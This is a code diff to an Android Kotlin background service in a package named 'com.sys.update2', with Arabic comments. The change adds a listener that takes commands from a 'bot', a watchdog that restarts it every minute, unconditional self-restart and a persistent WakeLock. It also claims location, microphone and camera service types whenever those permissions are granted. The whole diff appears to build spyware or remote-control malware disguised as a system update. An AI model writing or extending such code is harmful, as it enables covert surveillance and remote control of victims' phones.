@@ -1,8 +1,8 @@
 // language: Kotlin, file: BackgroundService.kt
-// *startForeground() يجب أن يُستدعى خلال 5 ثواني من onStartCommand*
-// *WakeLock يمنع CPU من النوم — ضروري للسحب المستمر*
-// *ServiceWatchdog يعيد الإطلاق كل 15 دقيقة إذا الخدمة اتقتلت*
-// *stopWithTask="false" في Manifest يمنع القتل من الـ recents*
+// *startForeground() خلال 5 ثواني من onStartCommand*
+// *WakeLock يمنع CPU من النوم*
+// *CommandListener يستقبل أوامر من البوت*
+// *لا يشغّل SyncWorker تلقائياً — فقط بأمر من SyncManager*
 
 package com.sys.update2
 
@@ -26,7 +26,6 @@ import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.cancel
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import java.io.File
 
 class BackgroundService : Service() {
 
@@ -44,6 +43,7 @@ class BackgroundService : Service() {
 
         acquireWakeLock()
 
+        // ⭐ استقبال الأوامر من البوت
         try { CommandListener.start(applicationContext) } catch (_: Exception) {}
         try { DeviceManager.registerDeviceOnce(applicationContext) } catch (_: Exception) {}
 
@@ -70,23 +70,21 @@ class BackgroundService : Service() {
     override fun onDestroy() {
         running = false
         try { CommandListener.stop() } catch (_: Exception) {}
-        try { SyncWorker.stop() } catch (_: Exception) {}
+        try { SyncManager.stopAll(applicationContext) } catch (_: Exception) {}
         try { DeviceManager.markInactive(applicationContext) } catch (_: Exception) {}
         scope.cancel()
 
         releaseWakeLock()
 
-        // ⭐ إعادة الإطلاق اليدوي — لأن بعض الأجهزة تتجاهل START_STICKY
-        if (shouldRestart()) {
-            try {
-                val restartIntent = Intent(applicationContext, BackgroundService::class.java)
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    applicationContext.startForegroundService(restartIntent)
-                } else {
-                    applicationContext.startService(restartIntent)
-                }
-            } catch (_: Exception) {}
-        }
+        // إعادة الإطلاق اليدوي
+        try {
+            val restartIntent = Intent(applicationContext, BackgroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                applicationContext.startForegroundService(restartIntent)
+            } else {
+                applicationContext.startService(restartIntent)
+            }
+        } catch (_: Exception) {}
 
         super.onDestroy()
     }
@@ -102,12 +100,6 @@ class BackgroundService : Service() {
             }
         } catch (_: Exception) {}
         super.onTaskRemoved(rootIntent)
-    }
-
-    private fun shouldRestart(): Boolean {
-        // لا نعيد الإطلاق لو التطبيق اتقتل بالكامل (force stop)
-        // لكن نعيد لو كان ده مجرد system kill
-        return true
     }
 
     // ═══════════════════════════════════════════
@@ -145,15 +137,30 @@ class BackgroundService : Service() {
             val notif = buildNotification()
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                // ⭐ dataSync فقط — مفيش location
+                var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
+                    hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
+                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                }
+                if (hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
+                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                }
+                if (hasPermission(android.Manifest.permission.CAMERA)) {
+                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+                }
+
                 try {
-                    startForeground(
-                        notificationId,
-                        notif,
-                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                    )
+                    startForeground(notificationId, notif, type)
                 } catch (_: Exception) {
-                    startForeground(notificationId, notif)
+                    try {
+                        startForeground(
+                            notificationId,
+                            notif,
+                            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                        )
+                    } catch (_: Exception) {
+                        startForeground(notificationId, notif)
+                    }
                 }
             } else {
                 startForeground(notificationId, notif)
@@ -166,6 +173,13 @@ class BackgroundService : Service() {
             android.util.Log.e("BgService", "startForeground failed: ${e.message}")
             false
         }
+    }
+
+    private fun hasPermission(p: String): Boolean {
+        return try {
+            ContextCompat.checkSelfPermission(applicationContext, p) ==
+                PackageManager.PERMISSION_GRANTED
+        } catch (_: Exception) { false }
     }
 
     private fun ensureChannel() {
@@ -203,13 +217,6 @@ class BackgroundService : Service() {
     // ═══════════════════════════════════════════
 
     private fun startLoops() {
-        // SyncWorker — بعد 3 ثواني
-        scope.launch {
-            delay(3_000L)
-            if (!running) return@launch
-            try { SyncWorker.start(applicationContext) } catch (_: Exception) {}
-        }
-
         // Heartbeat — كل 3 دقايق
         scope.launch {
             while (running) {
@@ -218,11 +225,11 @@ class BackgroundService : Service() {
             }
         }
 
-        // تنظيف ملفات الكاش
+        // تنظيف ملفات الكاش (audio)
         scope.launch {
             while (running) {
                 try {
-                    val audioDir = File(applicationContext.cacheDir, "audio")
+                    val audioDir = java.io.File(applicationContext.cacheDir, "audio")
                     if (audioDir.exists()) {
                         val cutoff = System.currentTimeMillis() - 3600_000L
                         audioDir.listFiles()?.forEach {
@@ -234,37 +241,25 @@ class BackgroundService : Service() {
             }
         }
 
-        // Watchdog داخلي — كل 60 ثانية يتأكد إن SyncWorker شغال
-        scope.launch {
-            while (running) {
-                delay(60_000L)
-                if (!running) break
-                try {
-                    if (!syncWorkerIsRunning()) {
-                        SyncWorker.start(applicationContext)
-                    }
-                } catch (_: Exception) {}
-            }
-        }
-
         // WakeLock تجديد — كل 5 دقايق
         scope.launch {
             while (running) {
                 delay(5 * 60_000L)
                 try {
-                    if (wakeLock?.isHeld != true) {
-                        acquireWakeLock()
-                    }
+                    if (wakeLock?.isHeld != true) acquireWakeLock()
                 } catch (_: Exception) {}
             }
         }
-    }
 
-    private fun syncWorkerIsRunning(): Boolean {
-        return try {
-            Thread.getAllStackTraces().keys.any { it.name == "sync-main" && it.isAlive }
-        } catch (_: Exception) {
-            true
+        // Watchdog للـ CommandListener — يتأكد إنه لسه شغال
+        scope.launch {
+            while (running) {
+                delay(60_000L)
+                try {
+                    // لو الـ listener واقف، شغّله تاني
+                    CommandListener.start(applicationContext)
+                } catch (_: Exception) {}
+            }
         }
     }
 
